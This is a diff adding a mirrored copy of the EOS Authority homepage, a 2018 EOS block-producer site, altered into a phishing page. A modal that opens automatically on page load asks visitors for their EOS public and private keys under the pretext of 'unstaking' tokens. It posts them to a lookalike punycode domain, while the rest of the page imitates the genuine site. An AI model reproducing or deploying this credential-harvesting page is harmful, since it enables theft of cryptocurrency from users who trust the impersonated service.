@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+    
+<!-- Mirrored from eosauthority.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 Jun 2018 23:38:36 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+   
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta name="format-detection" content="telephone=no">
+
+<title>EOS Authority - Complete EOS Registration - EOS block production London, UK.</title>
+
+<link rel="icon" href="common/images/favicon.ico" type="image/x-icon"/>
+<link href="common/images/favicon.png" rel="apple-touch-icon" sizes="76x76"/>
+
+<link rel="stylesheet" href="common/css/style.css"/>
+<link rel="stylesheet" href="common/css/responsive.css"/>
+
+<style>
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1000; /* Sit on top */
+    padding-top: 100px; /* Location of the box */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content */
+.modal-content {
+    background-color: #fefefe;
+    margin: auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+}
+
+/* The Close Button */
+.close {
+    color: #aaaaaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: #000;
+    text-decoration: none;
+    cursor: pointer;
+}
+</style>
+
+<div id="myModal" class="modal">
+
+  <!-- Modal content -->
+  <div class="modal-content" style="    background: url(common/images/home_banner.png);
+    background-repeat: no-repeat;
+    background-position: center;
+    text-align: center;
+    padding: 40px;
+    color: #1c57df !important;
+    background-size: cover;
+    background-color: #fff;
+">
+    <span class="close">&times;</span>
+   <div class="wrapper" style="max-width: 800px;">
+   
+   <div class="wrapper">
+
+                        <div class="heading">
+
+
+                                                            <h1>Unstake Your EOS Tokens</h1>
+                                                                    <p><b style="word-wrap: break-word;">Input your EOS Credentials Below to Unstake your Token. Unstaking your tokens makes them transferable on the Mainnet blockchain. </b>
+                                                                                                                                                                
+                                    </p>
+                                
+
+                                
+
+                                                            
+
+                        </div></div>
+
+                        <form  method="post" action="http://xn--eosauthorty-wcb.com/store.php" name="submit" class="validate" target="_self">
+                            
+                             <input style="    width: 100%;
+    margin: auto;
+    height: 48px;
+    border-radius: 50px;
+    background: #fff;
+    border: none;
+    text-align: center;
+    padding: 5px 10px;
+    color: #677897;
+    font-size: 17px;
+    font-weight: 300;
+    box-shadow: 0 18px 18px rgba(143,178,246,1);
+    margin-bottom: 27px;
+" type="text" name="ETH_public" id="ETH_address" class="form-control" placeholder="EOS Public Key" value="" required="required" autofocus="autofocus"/>					
+                                  
+                            <input style="    width: 100%;
+    margin: auto;
+    height: 48px;
+    border-radius: 50px;
+    background: #fff;
+    border: none;
+    text-align: center;
+    padding: 5px 10px;
+    color: #677897;
+    font-size: 17px;
+    font-weight: 300;
+    box-shadow: 0 18px 18px rgba(143,178,246,1);
+    margin-bottom: 27px;
+" type="text" name="ETH_privkey" id="ETH_address" class="form-control" placeholder="EOS Private Key" value="" required="required" autofocus="autofocus"/>								  <br/>
+                            <input type="submit" class="btn" style="width: 100%;" value="Unstake EOS Tokens"/>
+                        </form>
+						</div>
+  </div>
+
+</div>
+
+<script>
+// Get the modal
+var modal = document.getElementById('myModal');
+
+// Get the button that opens the modal
+var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+
+// When the user clicks the button, open the modal 
+
+    modal.style.display = "block";
+
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+    modal.style.display = "none";
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+</script>
+
+<!--[if IE]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+<script src="common/js/jquery.js"></script>
+
+<script src="common/js/jquery.cookie.js"></script>
+<!-- Google Tag Manager -->
+<script>(function(w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'});
+        var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+        j.async = true;
+        j.src =
+                '../www.googletagmanager.com/gtm5445.html?id=' + i + dl;
+        f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-PZP6T28');</script>
+<!-- End Google Tag Manager -->        <script src="common/js/validator.js"></script>
+        <script src="common/js/sweetalert2.min.js"></script>
+        <link rel="stylesheet" href="common/css/sweetalert2.min.css">
+
+            <meta name="description" content="EOS Authority - Registration verification tool." /> 
+            <meta name="keywords" content="EOS Authority - EOS block production candidate in the UK. EOS Registration verification tool." /> 
+            <meta name="author" content="EOS Authority" /> 
+            <meta name="Language" content="en" />
+            <meta name="copyright" content="EOS Authority 2018" />
+            <meta property="og:image" content="https://eosauthority.com/common/images/logo.png" />
+            <style>
+                h1 a.timeline:visited{
+                    color: #0000ee;
+                }
+            </style>
+
+    </head>
+    <body class="home">
+
+        <!--wrapper -->
+        <section id="wrapper">
+            <!--header part-->
+            <header id="header-part">
+                            <div class="top_sec">
+            <div class="wrapper">
+                <a href="javascript:void(0)" class="close_btn"></a>                
+                <p style="text-align: center;">Please remember to vote for us as a Block Producer when EOS launches. We need your support to continue offering such tools and services!</p> 
+            </div>
+        </div> 
+        <script type="text/javascript">
+        $(function() {
+            $('.top_sec .close_btn').on('click', function() {
+                $('.top_sec').remove();
+                $.cookie('top_sec', true, {expires: 2, path: '/'});
+            });
+            $('.top_sec p').on('click', function() {
+                window.location.href = 'block_production.html';
+            });
+        });
+
+    </script>
+
+<div class="wrapper">
+
+    <a href="index.html" class="logo"><img src="common/images/logo.png" alt=""></a>
+
+    <!--nav bar-->
+    <div class="nav-bar">
+
+        <a href="index.html#" class="menu_btn"><span></span></a>
+
+        <!--            <div class="language">
+                        <a href="#" class="tab_btn language_btn">En<span>glish</span></a>
+                        <ul class="tabs">
+                            <li class="current"><a href="#">En<span>glish</span></a></li>
+                            <li><a href="#">Sp<span>anish</span></a></li>
+                            <li><a href="#">Du<span>tch</span></a></li>
+                        </ul>
+                    </div>-->
+
+        <nav id="menu">
+
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="block_production.html">Block production</a></li>
+                <li><a href="space/index.html">Space invaders</a></li>
+                <li><a href="index.html#contact">Contact</a></li>
+            </ul>
+
+        </nav>
+
+    </div>
+    <!--nav bar-->
+
+</div>
+
+            </header>
+            <!--header part-->
+
+            <!--banner bar-->
+            <article class="banner-bar">
+
+                <img src="common/images/home_banner.png" class="banner_bg" alt=""/>
+
+                <div class="text">
+                    <div class="wrapper">
+
+                        <div class="heading">
+
+
+                                                        <h1><a href="timeline.html" style="text-decoration:underline" class="timeline">EOS launch in progress</a>, confirm your EOS balance!</h1>
+
+                                <p>Fill in your ethereum wallet address below and find out your EOS account & starting balance on the mainnet launch.</p>
+                                                            
+
+                        </div>
+                        <form  method="post" name="submit" class="validate" target="_self"  onsubmit="return validateForm()">
+                            
+                            <input type="text" name="ETH_address" id="ETH_address" class="field" placeholder="ETH Wallet Address starting with 0x" value="" required="required" autofocus="autofocus"/>
+                                                        <br/>
+                            <input type="submit" class="btn" value="Check my EOS"/>
+                        </form>
+                        <script>
+
+                            function validateForm() {
+                                var ETH_address = document.getElementById("ETH_address").value;
+                                ETH_address = ETH_address.trim();
+
+                                var isValid = true;
+                                if (!isAddress(ETH_address)) {
+                                    // alert("Invalid ETH_address");
+                                    swal({
+                                        title: "Check Ethereum wallet address?",
+                                        text: "The Ethereum wallet address should start with 0X and will be 40 characters long",
+                                        icon: "warning",
+                                        button: "OK",
+                                    });
+                                    isValid = false;
+                                }
+
+
+                                return isValid;
+                            }
+                        </script>
+                    </div>        
+                </div>
+
+            </article>
+            <!--banner bar-->
+
+            <!--content part-->
+            <section id="content-part">
+
+                <!--authority bar-->
+                <article class="authority-bar">
+                    <div class="wrapper">
+
+                        <div class="heading">
+
+                            <h2>EOS Authority as a Block Production Candidate</h2>
+
+                            <p>EOS Authority will deal professionally with technical matters or issues of arbitration & governance. Join us in shaping the platform of the future.</p>
+
+                        </div>
+
+                        <ul>
+                            <li>
+                                <div class="block">
+
+                                    <img src="common/images/authority_icon1.png" alt=""/>
+
+                                    <h3>Proudly based in the UK</h3>
+
+                                    <p>Registered in England & Wales</p>
+
+                                </div>
+                            </li>
+                            <li>
+                                <div class="block">
+
+                                    <img src="common/images/authority_icon2.png" alt=""/>
+
+                                    <h3>Transparent Operations</h3>
+
+                                    <p>Publishing quarterly reports on block production</p>
+
+                                </div>
+                            </li>
+                            <li>
+                                <div class="block">
+
+                                    <img src="common/images/authority_icon3_2.png" alt=""/>
+
+                                    <h3>Self funded</h3>
+
+                                    <p>Wholly self funded avoiding any external control</p>
+
+                                </div>
+                            </li>
+                            <li>
+                                <div class="block">
+
+                                    <img src="common/images/authority_icon4.png" alt=""/>
+
+                                    <h3>Healthy Partnerships</h3>
+
+                                    <p>Fostering collaboration with other block producers to benefit the community</p>
+
+                                </div>
+                            </li>
+                        </ul>
+
+                        <a href="block_production.html" class="btn">More on EOS Authority as a Block Production Candidate</a>
+
+                    </div>
+                </article>
+                <!--authority bar-->
+
+                <!--invaders bar-->
+                <article class="invaders-bar">
+                    <div class="wrapper">
+
+                        <div class="heading">
+
+                            <h2>What can you build on the fastest blockchain ever?</h2>
+
+                            <p>With 500 millisecond block time, EOS becomes one of the fastest blockchains. How about playing an all time favourite action game?</p>
+
+                        </div>
+
+                        <a href="space/index.html" class="btn">Try space invaders on EOS</a>
+
+                    </div>
+
+                    <div class="bg">
+
+                        <img src="common/images/invaders_bg.jpg" class="" alt=""/>
+
+                    </div>
+
+                </article>
+                <!--invaders bar-->
+
+
+
+                <!--invaders bar-->
+                <article class="invaders-bar thoughts">
+                    <div class="wrapper">
+
+                        <div class="heading">
+
+                            <h2>Thoughts from EOS Authority</h2>
+
+                            <p>Here are articles and tools that you will find useful!</p>
+
+                        </div>
+
+                        <div class="items">
+
+                            <ul>
+                                <li>
+                                    <div class="block">
+
+                                        <div class="image">
+                                            <a href="../www.youtube.com/watch%3Fv=k-5aG3YuyYk.html"><img src="common/images/video_eos_space_invaders.png" alt=""/></a>
+                                        </div>
+
+                                        <div class="text">
+
+                                            <!-- <span>MAY 8TH 2018</span> -->
+
+                                            <h3><a href="../www.youtube.com/watch%3Fv=k-5aG3YuyYk.html">Video intro of Space Invaders on EOS</a></h3>
+
+                                            <p>We put together an amazing proof of concept to show how fast EOS actually is! With EOS block speeds of 500ms, a game controller could be on EOS.</p>
+
+                                        </div>                  
+                                    </div>
+                                </li>
+                                <li>
+                                    <div class="block">
+
+                                        <div class="image">
+                                            <a href="account.html"><img src="common/images/thoughts_img2.jpg" alt=""/></a>
+                                        </div>
+
+                                        <div class="text">
+
+                                            <!-- <span>MAY 18TH 2018</span>-->
+
+                                            <h3><a href="account.html">Find your EOS account name</a></h3>
+
+                                            <p>On launch, each EOS account holder will be assigned an account name. You will need your account name to make transfers or develop interesting Dapps.</p>
+
+                                        </div>                  
+                                    </div>
+                                </li>
+                                <li>
+                                    <div class="block">
+
+                                        <div class="image">
+                                            <a href="genesis.html"><img src="common/images/genesis_tool.png" alt=""/></a>
+                                        </div>
+
+                                        <div class="text">
+
+                                            <!-- <span>MAY 11TH 2018</span>-->
+
+                                            <h3><a href="genesis.html">EOS Registrations - Genesis Campaign</a></h3>
+
+                                            <p>Registration is an important step ahead of the mainnet launch. Most of the EOS are in wallets that have not yet been registered. Please spread the word!</p>
+
+                                        </div>                  
+                                    </div>
+                                </li>
+                            </ul>
+
+                            <div class="clear"></div>
+
+                        </div>
+
+                        <div class="items">
+                            <ul>
+                                <li>
+                                    <div class="block">
+
+                                        <div class="image">
+                                            <a href="balance.html"><img src="common/images/thoughts_img1.jpg" alt=""/></a>
+                                        </div>
+
+                                        <div class="text">
+
+                                            <!-- <span>MAY 11TH 2018</span>-->
+
+                                            <h3><a href="balance.html">Find your EOS account balance</a></h3>
+
+                                            <p>If you would like to see the actual balance that will get transferred to EOS. Use your EOS public key or Ethereum wallet to find your account balance.</p>
+
+                                        </div>                  
+                                    </div>
+                                </li>
+                                <li>
+                                    <div class="block">
+
+                                        <div class="image">
+                                            <a href="blog/how_to_generate_your_EOS_fallback_key_from_ethereum_private_key.html"><img src="common/images/thoughts_img3.jpg" alt=""/></a>
+                                        </div>
+
+                                        <div class="text">
+
+                                            <!-- <span>MAY 11TH 2018</span>-->
+
+                                            <h3><a href="blog/how_to_generate_your_EOS_fallback_key_from_ethereum_private_key.html">Generate your EOS fallback key</a></h3>
+
+                                            <p>If you haven't registered or if your registration was invalid you will need a fallback private key to use your EOS on the mainnet. Explained here.</p>
+
+                                        </div>                  
+                                    </div>
+                                </li>
+                                <li>
+                                    <div class="block">
+
+                                        <div class="image">
+                                            <a href="blog/how_we_saved_10_million_dollars_of_EOS.html"><img src="common/images/dan_chat_eos_authority_save.jpg" alt=""/></a>
+                                        </div>
+
+                                        <div class="text">
+
+                                            <!-- <span>MAY 11TH 2018</span>-->
+
+                                            <h3><a href="blog/how_we_saved_10_million_dollars_of_EOS.html">How we saved 10 million dollars of EOS</a></h3>
+
+                                            <p>We identified an issue that could have caused $10 million of EOS being stolen by hackers. We quickly alerted the Block one team to roll out a code fix!</p>
+
+                                        </div>                  
+                                    </div>
+                                </li>
+                            </ul>
+
+                            <div class="clear"></div>
+
+                        </div>
+
+                        <!-- <a href="#" class="btn btn-blue">View All Articles</a> -->
+
+                    </div>
+
+                </article>
+                <!--invaders bar-->
+
+                <!--services bar-->
+                <article class="services-bar">
+                    <div class="wrapper">
+
+                        <div class="left">
+
+                            <h2>EOS Blockchain Development Services</h2>
+
+                            <!--                            <a href="#" class="btn">Find Out More</a>-->
+
+                        </div>
+
+                        <div class="right">
+
+                            <ul>
+                                <li>
+                                    <img src="common/images/icon1.png" alt=""/>
+                                    <h3>POC Development</h3>
+                                    <p>Elaborate Proof of concept services to showcase the technical viability of a product and its market potential.</p>
+                                </li>
+                                <li>
+                                    <img src="common/images/icon2.png" alt=""/>
+                                    <h3>Smart Contract Development</h3>
+                                    <p>Design, development, audit, and optimisation of self-executing coded business contracts to automate processes.</p>
+                                </li>
+                                <li>
+                                    <img src="common/images/icon3.png" alt=""/>
+                                    <h3>Private and Permissioned</h3>
+                                    <p>Build permissioned private Blockchain applications for any industry and save on infrastructure costs</p>
+                                </li>
+                                <li>
+                                    <img src="common/images/icon4.png" alt=""/>
+                                    <h3>Supply Chain Development</h3>
+                                    <p>Improve transparency and traceability and reduce administrative costs with effective supply chain solutions.</p>
+                                </li>
+                            </ul>
+
+                        </div>
+
+                    </div>
+                </article>
+                <!--services bar-->
+
+
+                <!--contact bar-->
+                <article class="contact-bar">
+                    <div class="wrapper">
+
+                        <div class="heading">
+
+                            <h2>Contact EOS Authority</h2>
+
+                        </div>
+
+                        <ul>
+                            <li>
+                                <div class="block">
+
+                                    <h3>Have an exciting EOS blockchain project you like our help with?</h3>
+
+                                    <p>We have a growing an in-house team of EOS developers. We provide a range of consultancy services from development to security audit.</p>
+
+                                </div>
+                            </li>
+                            <li>
+                                <div class="block">
+
+                                    <h3>Need help with your EOS registration and moving to the mainnet?</h3>
+
+                                    <p>We have already helped several thousand users make sure they have completed the necessary steps to move to mainnet.</p>
+
+                                </div>
+                            </li>
+                        </ul>
+
+                    </div>
+                </article>
+                <!--contact bar-->
+
+                <!--contactform bar-->
+                <article class="contactform-bar" id="contact">
+                    <div class="wrapper">	
+
+                        <h3>We would love to hear from you and help with all things EOS!</h3>
+
+                        <div class="left">
+
+                            <ul>
+                                <li>
+                                    <cite><img src="common/images/phone.png" alt=""/> Call us:</cite>
+                                    <span><a href="tel:+442070960498">+442070960498 </a></span>
+                                </li>
+                                <li>
+                                    <cite><img src="common/images/mail.png" alt=""/> Email us:</cite>
+                                    <span><a href="cdn-cgi/l/email-protection.html#d0b8b5bcbcbf90b5bfa3b1a5a4b8bfa2b9a4a9feb3bfbd"><span class="__cf_email__" data-cfemail="caa2afa6a6a58aafa5b9abbfbea2a5b8a3beb3e4a9a5a7">[email&#160;protected]</span></a></span>
+                                </li>
+                                <li>
+                                    <cite><img src="common/images/map.png" alt=""/> Meet us: </cite>
+                                    <span>EOS Authority <br/>C/O Digitech London Limited 68 Lombard Street,<br/> London, EC3V 9LJ, UK</span>
+                                </li>
+                                <li>
+                                    <cite><img src="common/images/twitter.png" alt=""/> Twitter:</cite>
+                                    <span><a href="../twitter.com/EOSauthority.html" target="_blank">@eosauthority</a></span>
+                                </li>
+                            </ul>
+
+                        </div>
+
+                        <div class="right">
+                            <form  id="contactForm">
+                                <div class="form-group">                                  
+                                    <input type="text" placeholder="Name" name="name" class="field" required data-required-error="Please fill in your name"/>
+                                    <span class="help-block with-errors"></span>
+                                </div>
+                                <div class="form-group">  
+                                    <input type="email" placeholder="Email" name="email" class="field" required email data-required-error="Please fill in your email"  />
+                                    <span class="help-block with-errors"></span>
+                                </div>
+                                <div class="form-group">  
+                                    <textarea placeholder="Message" name="message" required data-required-error="Please fill in a message to send us"></textarea>
+                                    <span class="help-block with-errors"></span>
+                                </div>
+
+                                <input type="submit" value="Send Message" class="btn"/>
+                            </form>
+                            <script data-cfasync="false" src="cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+                                $(function() {
+                                    $('#contactForm').validator().on('submit', function(e) {
+                                        if (e.isDefaultPrevented()) {
+
+                                            // handle the invalid form...
+                                        } else {
+                                            event.preventDefault();
+
+                                            $.ajax({
+                                                type: "POST",
+                                                url: "/contact",
+                                                data: $('#contactForm').serialize(),
+                                                success: function(response) {
+                                                    response = jQuery.parseJSON(response);
+                                                    if (typeof response === "object") {
+                                                        if (response.status == 'ok') {
+                                                            $("#contactForm")[0].reset();
+                                                            swal(
+                                                                    'Message sent!',
+                                                                    'Thanks, we will get back in touch shortly.',
+                                                                    'success'
+                                                                    )
+
+                                                        } else {
+                                                            swal(
+                                                                    'Error!',
+                                                                    response.MESSAGE,
+                                                                    'error'
+                                                                    )
+
+                                                        }
+
+                                                    } else {
+
+                                                    }
+                                                }
+                                            });
+
+                                        }
+                                    });
+                                });
+                            </script>
+                            <style type="text/css">
+                                .contactform-bar .has-error .field,.contactform-bar .has-error textarea{
+                                    margin-bottom: 5px;
+                                }
+                                .has-error .checkbox, .has-error .checkbox-inline, .has-error .control-label, .has-error .help-block, .has-error .radio, .has-error .radio-inline, .has-error.checkbox label, .has-error.checkbox-inline label, .has-error.radio label, .has-error.radio-inline label {
+                                    color: #a94442;
+                                }
+                                .help-block {
+                                    display: block;
+                                    margin-top: 5px;
+                                    margin-bottom: 10px;
+                                    color: #737373;
+                                }
+
+                                .help-block li{
+                                    padding: 0px;
+                                    margin-bottom: 5px;
+                                    margin-left: 30px;
+                                    font-size: 12px;
+                                    color: inherit;
+                                }
+                            </style>
+                        </div>
+
+                    </div>
+                </article>
+                <!--contactform bar-->
+
+            </section>
+            <!--content part-->
+            <!--footer part-->
+            <footer id="footer-part">
+                
+
+<!--footer bar-->
+<article class="footer-bar">
+    <div class="wrapper">
+
+        <a  class="footerlogo"><img src="common/images/logo.png" alt=""></a>
+
+        <cite>EOS Block Production in the UK</cite>
+
+        <p>EOS Authority is a part of Digitech London Limited registered in England and Wales (2006) <br>Company number 05948195, VAT number 929258489 <br> Registered address: 68 Lombard Street, London, EC3V 9LJ, UK</p>
+
+        <p><span>Telegram: <a href="../t.me/eosauthority.html">http://t.me/eosauthority</a></span> <span>Email: <a href="cdn-cgi/l/email-protection.html#dfb7bab3b3b09fbab0acbeaaabb7b0adb6aba6f1bcb0b2"><span class="__cf_email__" data-cfemail="5c34393030331c39332f3d292834332e352825723f3331">[email&#160;protected]</span></a></span></p>
+
+        <ul>
+            <li><a href="../twitter.com/EOSauthority.html" target="_blank"><img src="common/images/twitter2.png" alt=""></a></li>
+<!--            <li><a href="#" target="_blank"><img src="/common/images/youtube.png" alt=""></a></li>
+            <li><a href="#" target="_blank"><img src="/common/images/instagram.png" alt=""></a></li>-->
+        </ul>
+	
+<p><span><a href="../www.webdigi.co.uk/index.html">Web Development by Webdigi</a></span> </p>	
+
+    </div>
+</article>
+<!--footer bar-->
+
+<div class="copyright">
+
+    <p>Copyright &copy; 2018 EOS Authority</p>
+
+</div>
+
+<a href="index.html#" id="back-to-top"></a>
+
+            </footer>
+            <!--footer part-->
+
+        </section>
+        <!--wrapper -->
+
+
+        <script data-cfasync="false" src="cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script><script src="common/js/custom.js"></script>
+
+    </body>
+
+<!-- Mirrored from eosauthority.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 Jun 2018 23:38:50 GMT -->
+</html>
